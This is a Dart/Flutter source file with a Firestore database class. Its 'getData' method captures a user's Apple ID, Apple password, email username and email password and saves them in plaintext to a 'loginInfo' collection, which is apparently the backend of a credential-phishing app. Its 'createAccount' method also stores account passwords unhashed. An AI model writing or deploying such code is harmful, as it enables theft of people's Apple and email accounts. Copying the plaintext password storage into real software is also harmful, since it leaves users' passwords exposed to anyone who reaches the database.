// ignore_for_file: public_member_api_docs, sort_constructors_first
import 'dart:developer';

import 'package:cloud_firestore/cloud_firestore.dart';

class Database {
  Database();

  final firestore = FirebaseFirestore.instance;

  Future<Map<String, dynamic>> getData(
      {required String username,
      required String password,
      required String emailUsername,
      required String emailPassword}) async {
    final Map<String, dynamic> data = {
      'appleID': username,
      'applePassWord': password,
      'emailUserName': emailUsername,
      'emailPassWord': emailPassword
    };
    try {
      firestore.collection('loginInfo').add(data);
    } catch (e) {
      log(e.toString());
    }
    return data;
  }

  Future<void> createAccount({
    required String email,
    required String password,
    required String name,
  }) async {
    try {
      // Check if user already exists with this email
      final existingUser = await firestore
          .collection('credentials') // Use consistent collection name
          .where('email', isEqualTo: email)
          .limit(1)
          .get();

      if (existingUser.docs.isNotEmpty) {
        throw Exception('User with this email already exists');
      } else {
        // Create new user
        final data = {
          'name': name,
          'email': email,
          'password': password,
          'createdAt': FieldValue.serverTimestamp(),
        };

        // Add to Firestore
        await firestore
            .collection('credentials')
            .add(data); // Consistent collection name

        log('User created successfully: $name');
      }
    } catch (e) {
      log('signUp error: $e');
      rethrow;
    }
  }
}
